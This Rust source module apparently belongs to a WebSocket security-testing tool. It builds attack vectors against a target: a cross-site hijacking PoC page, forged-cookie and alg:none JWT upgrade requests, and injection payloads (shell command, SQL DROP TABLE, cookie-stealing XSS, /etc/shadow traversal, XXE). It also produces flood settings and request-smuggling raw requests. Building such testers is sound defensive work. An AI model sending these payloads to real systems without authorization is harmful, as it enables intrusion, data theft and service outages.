use std::fmt;

use serde::{Deserialize, Serialize};

/// Category of WebSocket attack being tested.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum WsAttackCategory {
    CrossSiteHijack,
    AuthBypass,
    MessageInjection,
    DenialOfService,
    ProtocolDowngrade,
    ConnectionSmuggling,
    TokenLeakage,
}

impl fmt::Display for WsAttackCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::CrossSiteHijack => "cross-site-websocket-hijacking",
            Self::AuthBypass => "auth-bypass",
            Self::MessageInjection => "message-injection",
            Self::DenialOfService => "denial-of-service",
            Self::ProtocolDowngrade => "protocol-downgrade",
            Self::ConnectionSmuggling => "connection-smuggling",
            Self::TokenLeakage => "token-leakage",
        };
        write!(f, "{label}")
    }
}

/// Severity rating for a discovered WebSocket vulnerability.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize, PartialOrd, Ord)]
pub enum WsSeverity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

impl fmt::Display for WsSeverity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::Info => "info",
            Self::Low => "low",
            Self::Medium => "medium",
            Self::High => "high",
            Self::Critical => "critical",
        };
        write!(f, "{label}")
    }
}

/// Format type for WebSocket message injection payloads.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum WsMessageFormat {
    JsonText,
    PlainText,
    Binary,
    XmlText,
    GraphQlSubscription,
    MsgPackBinary,
}

impl fmt::Display for WsMessageFormat {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::JsonText => "json-text",
            Self::PlainText => "plain-text",
            Self::Binary => "binary",
            Self::XmlText => "xml-text",
            Self::GraphQlSubscription => "graphql-subscription",
            Self::MsgPackBinary => "msgpack-binary",
        };
        write!(f, "{label}")
    }
}

/// A single generated attack test case for a WebSocket endpoint.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WsAttackVector {
    pub category: WsAttackCategory,
    pub name: String,
    pub description: String,
    pub severity: WsSeverity,
    pub payload: WsAttackPayload,
    pub detection_hint: String,
}

/// The concrete payload or configuration for a WebSocket attack.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum WsAttackPayload {
    /// Full HTML page content for CSWSH proof-of-concept.
    CswshPoc {
        html: String,
        attacker_origin: String,
    },
    /// Upgrade request manipulation for auth bypass.
    UpgradeRequest {
        headers: Vec<(String, String)>,
        with_cookies: bool,
    },
    /// Message to inject into a WebSocket connection.
    Message {
        format: WsMessageFormat,
        content: Vec<u8>,
    },
    /// DoS parameters for connection/frame abuse.
    DosConfig {
        technique: DosTechnique,
        parameter: u64,
    },
    /// Protocol downgrade test parameters.
    Downgrade {
        original_url: String,
        downgraded_url: String,
    },
    /// HTTP smuggling via upgrade mechanism.
    Smuggle { raw_request: String },
    /// Token leakage detection in URL parameters.
    TokenLeak {
        url: String,
        leaked_params: Vec<String>,
    },
}

/// Specific denial-of-service technique for WebSocket testing.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum DosTechnique {
    ConnectionFlood,
    OversizedFrame,
    PingFlood,
    SlowRead,
    FragmentFlood,
}

impl fmt::Display for DosTechnique {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::ConnectionFlood => "connection-flood",
            Self::OversizedFrame => "oversized-frame",
            Self::PingFlood => "ping-flood",
            Self::SlowRead => "slow-read",
            Self::FragmentFlood => "fragment-flood",
        };
        write!(f, "{label}")
    }
}

/// Configuration for running WebSocket hijack tests against an endpoint.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WsHijackConfig {
    pub target_url: String,
    pub attacker_origin: String,
    pub session_cookie: Option<String>,
    pub auth_token: Option<String>,
    pub max_connections: u64,
    pub max_frame_bytes: u64,
}

impl Default for WsHijackConfig {
    fn default() -> Self {
        Self {
            target_url: String::new(),
            attacker_origin: "https://evil.attacker.com".to_string(),
            session_cookie: None,
            auth_token: None,
            max_connections: 1000,
            max_frame_bytes: 16 * 1024 * 1024,
        }
    }
}

impl WsHijackConfig {
    pub fn with_target(mut self, url: &str) -> Self {
        self.target_url = url.to_string();
        self
    }

    pub fn with_attacker_origin(mut self, origin: &str) -> Self {
        self.attacker_origin = origin.to_string();
        self
    }

    pub fn with_session_cookie(mut self, cookie: &str) -> Self {
        self.session_cookie = Some(cookie.to_string());
        self
    }

    pub fn with_auth_token(mut self, token: &str) -> Self {
        self.auth_token = Some(token.to_string());
        self
    }

    pub fn with_max_connections(mut self, n: u64) -> Self {
        self.max_connections = n;
        self
    }

    pub fn with_max_frame_bytes(mut self, n: u64) -> Self {
        self.max_frame_bytes = n;
        self
    }
}

/// Full result of running all WebSocket attack categories against an endpoint.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WsHijackResult {
    pub target_url: String,
    pub attack_vectors: Vec<WsAttackVector>,
    pub summary: WsHijackSummary,
}

/// Summary statistics across all generated attack vectors.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WsHijackSummary {
    pub total_vectors: usize,
    pub critical_count: usize,
    pub high_count: usize,
    pub categories_tested: Vec<WsAttackCategory>,
}

/// Generates a CSWSH proof-of-concept HTML page that attempts a cross-origin
/// WebSocket connection to the target, optionally piggybacking on the
/// victim's session cookies.
pub fn generate_cswsh_poc(config: &WsHijackConfig) -> WsAttackVector {
    let cookie_js = config
        .session_cookie
        .as_ref()
        .map(|c| format!("document.cookie = \"{c}\";"))
        .unwrap_or_default();

    let html = format!(
        r#"<!DOCTYPE html>
<html>
<head><title>CSWSH PoC</title></head>
<body>
<h1>Cross-Site WebSocket Hijacking PoC</h1>
<div id="output"></div>
<script>
{cookie_js}
var ws = new WebSocket("{target}");
var out = document.getElementById("output");
ws.onopen = function() {{
    out.innerHTML += "<p>Connected from attacker origin: {origin}</p>";
    ws.send("CSWSH probe: attacker-controlled message");
}};
ws.onmessage = function(evt) {{
    out.innerHTML += "<p>Received: " + evt.data + "</p>";
}};
ws.onerror = function(err) {{
    out.innerHTML += "<p>Error: connection rejected (Origin validated)</p>";
}};
ws.onclose = function() {{
    out.innerHTML += "<p>Connection closed</p>";
}};
</script>
</body>
</html>"#,
        target = config.target_url,
        origin = config.attacker_origin,
    );

    WsAttackVector {
        category: WsAttackCategory::CrossSiteHijack,
        name: "cswsh-poc".to_string(),
        description: "Cross-Site WebSocket Hijacking proof-of-concept page that connects \
                       from an attacker-controlled origin to test Origin header validation"
            .to_string(),
        severity: WsSeverity::Critical,
        payload: WsAttackPayload::CswshPoc {
            html,
            attacker_origin: config.attacker_origin.clone(),
        },
        detection_hint: "If WebSocket connection succeeds from attacker origin, the server \
                         does not validate the Origin header"
            .to_string(),
    }
}

/// Generates auth bypass test vectors that probe whether the WebSocket
/// upgrade mechanism enforces HTTP authentication.
pub fn generate_auth_bypass_vectors(config: &WsHijackConfig) -> Vec<WsAttackVector> {
    let mut vectors = Vec::new();

    vectors.push(WsAttackVector {
        category: WsAttackCategory::AuthBypass,
        name: "upgrade-no-cookies".to_string(),
        description: "WebSocket upgrade request with no session cookies attached".to_string(),
        severity: WsSeverity::High,
        payload: WsAttackPayload::UpgradeRequest {
            headers: vec![
                ("Upgrade".to_string(), "websocket".to_string()),
                ("Connection".to_string(), "Upgrade".to_string()),
                (
                    "Sec-WebSocket-Key".to_string(),
                    "dGhlIHNhbXBsZSBub25jZQ==".to_string(),
                ),
                ("Sec-WebSocket-Version".to_string(), "13".to_string()),
            ],
            with_cookies: false,
        },
        detection_hint: "101 Switching Protocols without session cookie indicates auth bypass"
            .to_string(),
    });

    vectors.push(WsAttackVector {
        category: WsAttackCategory::AuthBypass,
        name: "upgrade-forged-cookie".to_string(),
        description: "WebSocket upgrade request with a forged/invalid session cookie".to_string(),
        severity: WsSeverity::High,
        payload: WsAttackPayload::UpgradeRequest {
            headers: vec![
                ("Upgrade".to_string(), "websocket".to_string()),
                ("Connection".to_string(), "Upgrade".to_string()),
                (
                    "Sec-WebSocket-Key".to_string(),
                    "dGhlIHNhbXBsZSBub25jZQ==".to_string(),
                ),
                ("Sec-WebSocket-Version".to_string(), "13".to_string()),
                (
                    "Cookie".to_string(),
                    "session=AAAAAAAAAAAAAAAAAAAAAA".to_string(),
                ),
            ],
            with_cookies: true,
        },
        detection_hint:
            "101 Switching Protocols with forged cookie indicates weak session validation"
                .to_string(),
    });

    vectors.push(WsAttackVector {
        category: WsAttackCategory::AuthBypass,
        name: "upgrade-expired-token".to_string(),
        description: "WebSocket upgrade with an expired JWT in Authorization header".to_string(),
        severity: WsSeverity::High,
        payload: WsAttackPayload::UpgradeRequest {
            headers: vec![
                ("Upgrade".to_string(), "websocket".to_string()),
                ("Connection".to_string(), "Upgrade".to_string()),
                (
                    "Sec-WebSocket-Key".to_string(),
                    "dGhlIHNhbXBsZSBub25jZQ==".to_string(),
                ),
                ("Sec-WebSocket-Version".to_string(), "13".to_string()),
                (
                    "Authorization".to_string(),
                    "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjowfQ.".to_string(),
                ),
            ],
            with_cookies: false,
        },
        detection_hint: "101 Switching Protocols with expired/alg:none JWT indicates token validation failure".to_string(),
    });

    if let Some(ref cookie) = config.session_cookie {
        vectors.push(WsAttackVector {
            category: WsAttackCategory::AuthBypass,
            name: "upgrade-with-valid-cookie".to_string(),
            description: "WebSocket upgrade with the real session cookie as a baseline comparison"
                .to_string(),
            severity: WsSeverity::Info,
            payload: WsAttackPayload::UpgradeRequest {
                headers: vec![
                    ("Upgrade".to_string(), "websocket".to_string()),
                    ("Connection".to_string(), "Upgrade".to_string()),
                    (
                        "Sec-WebSocket-Key".to_string(),
                        "dGhlIHNhbXBsZSBub25jZQ==".to_string(),
                    ),
                    ("Sec-WebSocket-Version".to_string(), "13".to_string()),
                    ("Cookie".to_string(), format!("session={cookie}")),
                ],
                with_cookies: true,
            },
            detection_hint: "Baseline: valid session should produce 101 Switching Protocols"
                .to_string(),
        });
    }

    vectors
}

/// Generates message injection payloads across multiple WebSocket message formats.
/// Returns at least 5 payload types covering JSON, plain text, binary, XML, and GraphQL.
pub fn generate_message_injection_payloads() -> Vec<WsAttackVector> {
    let mut vectors = Vec::new();

    vectors.push(WsAttackVector {
        category: WsAttackCategory::MessageInjection,
        name: "json-command-injection".to_string(),
        description: "JSON message with injected command field to override server-side processing"
            .to_string(),
        severity: WsSeverity::High,
        payload: WsAttackPayload::Message {
            format: WsMessageFormat::JsonText,
            content: br#"{"type":"admin","action":"execute","command":"cat /etc/passwd","__proto__":{"isAdmin":true}}"#.to_vec(),
        },
        detection_hint: "Server processes injected command or prototype pollution field".to_string(),
    });

    vectors.push(WsAttackVector {
        category: WsAttackCategory::MessageInjection,
        name: "json-sqli".to_string(),
        description: "JSON message with SQL injection in value field".to_string(),
        severity: WsSeverity::Critical,
        payload: WsAttackPayload::Message {
            format: WsMessageFormat::JsonText,
            content: br#"{"query":"search","term":"' OR 1=1; DROP TABLE users; --"}"#.to_vec(),
        },
        detection_hint: "Server returns SQL error or unexpected data indicating injection success"
            .to_string(),
    });

    vectors.push(WsAttackVector {
        category: WsAttackCategory::MessageInjection,
        name: "plaintext-xss".to_string(),
        description: "Plain text message with XSS payload that may be reflected to other clients"
            .to_string(),
        severity: WsSeverity::High,
        payload: WsAttackPayload::Message {
            format: WsMessageFormat::PlainText,
            content: b"<img src=x onerror=alert(document.cookie)>".to_vec(),
        },
        detection_hint: "Server echoes HTML payload unescaped to connected clients".to_string(),
    });

    vectors.push(WsAttackVector {
        category: WsAttackCategory::MessageInjection,
        name: "plaintext-path-traversal".to_string(),
        description: "Plain text message with path traversal payload for file-based WS handlers"
            .to_string(),
        severity: WsSeverity::High,
        payload: WsAttackPayload::Message {
            format: WsMessageFormat::PlainText,
            content: b"../../../../etc/shadow\x00".to_vec(),
        },
        detection_hint: "Server returns file contents or error revealing filesystem path"
            .to_string(),
    });

    vectors.push(WsAttackVector {
        category: WsAttackCategory::MessageInjection,
        name: "binary-overflow".to_string(),
        description: "Binary frame with oversized length prefix to trigger buffer handling bugs"
            .to_string(),
        severity: WsSeverity::Medium,
        payload: WsAttackPayload::Message {
            format: WsMessageFormat::Binary,
            content: {
                let mut buf = vec![0xFF; 4];
                buf.extend_from_slice(&[0x41; 256]);
                buf
            },
        },
        detection_hint: "Server crashes, hangs, or returns malformed response".to_string(),
    });

    vectors.push(WsAttackVector {
        category: WsAttackCategory::MessageInjection,
        name: "xml-xxe".to_string(),
        description: "XML message with XXE payload for servers that parse XML WebSocket messages"
            .to_string(),
        severity: WsSeverity::Critical,
        payload: WsAttackPayload::Message {
            format: WsMessageFormat::XmlText,
            content: br#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><msg>&xxe;</msg>"#.to_vec(),
        },
        detection_hint: "Server response contains file contents or XML parsing error referencing entity".to_string(),
    });

    vectors.push(WsAttackVector {
        category: WsAttackCategory::MessageInjection,
        name: "graphql-subscription-injection".to_string(),
        description: "GraphQL subscription message that attempts to subscribe to unauthorized data streams".to_string(),
        severity: WsSeverity::High,
        payload: WsAttackPayload::Message {
            format: WsMessageFormat::GraphQlSubscription,
            content: br#"{"type":"start","id":"1","payload":{"query":"subscription { adminLogs { action userId sensitiveData } }"}}"#.to_vec(),
        },
        detection_hint: "Server begins streaming admin data without authorization check".to_string(),
    });

    vectors.push(WsAttackVector {
        category: WsAttackCategory::MessageInjection,
        name: "msgpack-type-confusion".to_string(),
        description:
            "MsgPack-encoded binary payload with type confusion to bypass schema validation"
                .to_string(),
        severity: WsSeverity::Medium,
        payload: WsAttackPayload::Message {
            format: WsMessageFormat::MsgPackBinary,
            content: vec![
                0x82, // fixmap with 2 entries
                0xA4, 0x74, 0x79, 0x70, 0x65, // "type"
                0xA5, 0x61, 0x64, 0x6D, 0x69, 0x6E, // "admin"
                0xA6, 0x61, 0x63, 0x63, 0x65, 0x73, 0x73, // "access"
                0xC3, // true
            ],
        },
        detection_hint: "Server deserializes crafted MsgPack and grants elevated access"
            .to_string(),
    });

    vectors
}

/// Generates denial-of-service test vectors for WebSocket connection abuse.
pub fn generate_dos_vectors(config: &WsHijackConfig) -> Vec<WsAttackVector> {
    vec![
        WsAttackVector {
            category: WsAttackCategory::DenialOfService,
            name: "connection-flood".to_string(),
            description: format!(
                "Open {} concurrent WebSocket connections to exhaust server connection pool",
                config.max_connections
            ),
            severity: WsSeverity::Medium,
            payload: WsAttackPayload::DosConfig {
                technique: DosTechnique::ConnectionFlood,
                parameter: config.max_connections,
            },
            detection_hint: "Server stops accepting new connections or response times degrade"
                .to_string(),
        },
        WsAttackVector {
            category: WsAttackCategory::DenialOfService,
            name: "oversized-frame".to_string(),
            description: format!(
                "Send a single WebSocket frame of {} bytes to test frame size limits",
                config.max_frame_bytes
            ),
            severity: WsSeverity::Medium,
            payload: WsAttackPayload::DosConfig {
                technique: DosTechnique::OversizedFrame,
                parameter: config.max_frame_bytes,
            },
            detection_hint: "Server accepts unbounded frame sizes causing memory exhaustion"
                .to_string(),
        },
        WsAttackVector {
            category: WsAttackCategory::DenialOfService,
            name: "ping-flood".to_string(),
            description: "Rapid-fire WebSocket ping frames to consume server CPU on pong responses"
                .to_string(),
            severity: WsSeverity::Low,
            payload: WsAttackPayload::DosConfig {
                technique: DosTechnique::PingFlood,
                parameter: 10_000,
            },
            detection_hint: "Server CPU spikes or stops responding to legitimate traffic"
                .to_string(),
        },
        WsAttackVector {
            category: WsAttackCategory::DenialOfService,
            name: "slow-read".to_string(),
            description: "Open WebSocket and read responses extremely slowly to hold server \
                          resources"
                .to_string(),
            severity: WsSeverity::Medium,
            payload: WsAttackPayload::DosConfig {
                technique: DosTechnique::SlowRead,
                parameter: 60,
            },
            detection_hint: "Server buffers outbound data indefinitely for slow clients"
                .to_string(),
        },
        WsAttackVector {
            category: WsAttackCategory::DenialOfService,
            name: "fragment-flood".to_string(),
            description: "Send thousands of tiny fragmented frames that the server must reassemble"
                .to_string(),
            severity: WsSeverity::Low,
            payload: WsAttackPayload::DosConfig {
                technique: DosTechnique::FragmentFlood,
                parameter: 50_000,
            },
            detection_hint: "Server memory grows unbounded during fragment reassembly".to_string(),
        },
    ]
}

/// Generates protocol downgrade test vectors (ws:// when wss:// expected).
pub fn generate_downgrade_vectors(config: &WsHijackConfig) -> Vec<WsAttackVector> {
    let target = &config.target_url;
    let mut vectors = Vec::new();

    if target.starts_with("wss://") {
        let downgraded = target.replacen("wss://", "ws://", 1);
        vectors.push(WsAttackVector {
            category: WsAttackCategory::ProtocolDowngrade,
            name: "wss-to-ws-downgrade".to_string(),
            description: "Attempt plaintext WebSocket connection when TLS is expected".to_string(),
            severity: WsSeverity::High,
            payload: WsAttackPayload::Downgrade {
                original_url: target.clone(),
                downgraded_url: downgraded,
            },
            detection_hint: "Server accepts unencrypted WebSocket connection on the same path"
                .to_string(),
        });
    }

    if target.starts_with("wss://") || target.starts_with("ws://") {
        let http_url = target
            .replacen("wss://", "https://", 1)
            .replacen("ws://", "http://", 1);
        vectors.push(WsAttackVector {
            category: WsAttackCategory::ProtocolDowngrade,
            name: "ws-to-http-downgrade".to_string(),
            description: "Send a plain HTTP request to the WebSocket endpoint path".to_string(),
            severity: WsSeverity::Medium,
            payload: WsAttackPayload::Downgrade {
                original_url: target.clone(),
                downgraded_url: http_url,
            },
            detection_hint:
                "Server responds with meaningful HTTP content instead of 426 Upgrade Required"
                    .to_string(),
        });
    }

    vectors
}

/// Generates HTTP request smuggling vectors that abuse the WebSocket upgrade mechanism.
pub fn generate_smuggling_vectors(config: &WsHijackConfig) -> Vec<WsAttackVector> {
    let host = extract_host(&config.target_url);
    let path = extract_path(&config.target_url);

    vec![
        WsAttackVector {
            category: WsAttackCategory::ConnectionSmuggling,
            name: "h2c-smuggle-via-upgrade".to_string(),
            description: "Abuse WebSocket upgrade to smuggle an HTTP/2 cleartext connection"
                .to_string(),
            severity: WsSeverity::High,
            payload: WsAttackPayload::Smuggle {
                raw_request: format!(
                    "GET {path} HTTP/1.1\r\n\
                     Host: {host}\r\n\
                     Upgrade: h2c\r\n\
                     Connection: Upgrade, HTTP2-Settings\r\n\
                     HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA\r\n\
                     \r\n"
                ),
            },
            detection_hint: "Reverse proxy forwards smuggled HTTP/2 connection to backend"
                .to_string(),
        },
        WsAttackVector {
            category: WsAttackCategory::ConnectionSmuggling,
            name: "cl-te-websocket-smuggle".to_string(),
            description: "Content-Length / Transfer-Encoding desync exploiting WebSocket upgrade"
                .to_string(),
            severity: WsSeverity::Critical,
            payload: WsAttackPayload::Smuggle {
                raw_request: format!(
                    "GET {path} HTTP/1.1\r\n\
                     Host: {host}\r\n\
                     Upgrade: websocket\r\n\
                     Connection: Upgrade\r\n\
                     Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n\
                     Sec-WebSocket-Version: 13\r\n\
                     Content-Length: 0\r\n\
                     Transfer-Encoding: chunked\r\n\
                     \r\n\
                     0\r\n\
                     \r\n\
                     GET /admin HTTP/1.1\r\n\
                     Host: {host}\r\n\
                     \r\n"
                ),
            },
            detection_hint: "Backend processes smuggled /admin request in the same connection"
                .to_string(),
        },
        WsAttackVector {
            category: WsAttackCategory::ConnectionSmuggling,
            name: "upgrade-header-injection".to_string(),
            description: "Inject extra headers via CRLF in WebSocket upgrade path".to_string(),
            severity: WsSeverity::High,
            payload: WsAttackPayload::Smuggle {
                raw_request: format!(
                    "GET {path}%0d%0aX-Injected:%20true HTTP/1.1\r\n\
                     Host: {host}\r\n\
                     Upgrade: websocket\r\n\
                     Connection: Upgrade\r\n\
                     Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n\
                     Sec-WebSocket-Version: 13\r\n\
                     \r\n"
                ),
            },
            detection_hint: "Server processes injected X-Injected header or reflects it"
                .to_string(),
        },
    ]
}

/// Detects potential auth token leakage in WebSocket URL query parameters.
pub fn detect_token_leakage(ws_url: &str) -> Option<WsAttackVector> {
    let sensitive_params: &[&str] = &[
        "token",
        "access_token",
        "auth_token",
        "api_key",
        "apikey",
        "key",
        "secret",
        "password",
        "pwd",
        "session",
        "sessionid",
        "session_id",
        "jwt",
        "bearer",
        "credential",
        "auth",
    ];

    let Ok(parsed) = url::Url::parse(ws_url) else {
        return None;
    };

    let leaked: Vec<String> = parsed
        .query_pairs()
        .filter(|(key, _)| {
            let lower = key.to_ascii_lowercase();
            sensitive_params.iter().any(|&p| lower.contains(p))
        })
        .map(|(key, _)| key.to_string())
        .collect();

    if leaked.is_empty() {
        return None;
    }

    Some(WsAttackVector {
        category: WsAttackCategory::TokenLeakage,
        name: "url-token-exposure".to_string(),
        description: format!(
            "Authentication tokens detected in WebSocket URL query parameters: {}",
            leaked.join(", ")
        ),
        severity: WsSeverity::High,
        payload: WsAttackPayload::TokenLeak {
            url: ws_url.to_string(),
            leaked_params: leaked,
        },
        detection_hint:
            "Tokens in URL are logged by proxies, browser history, and referrer headers".to_string(),
    })
}

/// Runs the full WebSocket hijack analysis pipeline against a configured target.
/// Generates attack vectors for all 7 categories and returns a comprehensive result.
pub fn analyze_websocket_endpoint(config: &WsHijackConfig) -> WsHijackResult {
    let mut attack_vectors = Vec::new();

    attack_vectors.push(generate_cswsh_poc(config));

    attack_vectors.extend(generate_auth_bypass_vectors(config));

    attack_vectors.extend(generate_message_injection_payloads());

    attack_vectors.extend(generate_dos_vectors(config));

    attack_vectors.extend(generate_downgrade_vectors(config));

    attack_vectors.extend(generate_smuggling_vectors(config));

    if let Some(leak) = detect_token_leakage(&config.target_url) {
        attack_vectors.push(leak);
    }

    let critical_count = attack_vectors
        .iter()
        .filter(|v| v.severity == WsSeverity::Critical)
        .count();
    let high_count = attack_vectors
        .iter()
        .filter(|v| v.severity == WsSeverity::High)
        .count();

    let mut categories_tested: Vec<WsAttackCategory> = attack_vectors
        .iter()
        .map(|v| v.category)
        .collect::<std::collections::HashSet<_>>()
        .into_iter()
        .collect();
    categories_tested.sort_by_key(|c| format!("{c}"));

    let summary = WsHijackSummary {
        total_vectors: attack_vectors.len(),
        critical_count,
        high_count,
        categories_tested,
    };

    WsHijackResult {
        target_url: config.target_url.clone(),
        attack_vectors,
        summary,
    }
}

pub(crate) fn extract_host(url: &str) -> String {
    url::Url::parse(url)
        .ok()
        .and_then(|u| u.host_str().map(|h| h.to_string()))
        .unwrap_or_else(|| "localhost".to_string())
}

pub(crate) fn extract_path(url: &str) -> String {
    url::Url::parse(url)
        .ok()
        .map(|u| u.path().to_string())
        .unwrap_or_else(|| "/".to_string())
}

#[cfg(test)]
#[path = "websocket_hijack_test.rs"]
mod websocket_hijack_test;
